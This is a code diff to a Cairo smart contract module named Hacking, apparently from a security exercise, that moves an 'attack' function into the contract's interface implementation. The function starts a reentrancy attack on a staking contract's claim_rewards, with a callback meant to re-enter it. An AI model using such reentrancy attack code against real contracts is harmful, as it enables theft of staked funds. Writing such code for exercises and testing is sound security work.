@@ -18,16 +18,15 @@ pub mod Hacking {
         self.token_address.write(erc20_token);
     }
 
-    #[external(v0)]
-    pub fn attack(ref self: ContractState) {
-        // Initiate the reentrancy attack by calling claim_rewards
-        let staking_contract = self.staking_contract.read();
-        let dispatcher = IStakingDispatcher { contract_address: staking_contract };
-        dispatcher.claim_rewards(get_contract_address());
-    }
-
     #[abi(embed_v0)]
     impl HackingImpl of IHacking<ContractState> {
+        fn attack(ref self: ContractState) {
+            // Initiate the reentrancy attack by calling claim_rewards
+            let staking_contract = self.staking_contract.read();
+            let dispatcher = IStakingDispatcher { contract_address: staking_contract };
+            dispatcher.claim_rewards(get_contract_address());
+        }
+
         fn claim_rewards_callback(ref self: ContractState) {
             // This function is called during the external call
             // Attempt to re-enter claim_rewards
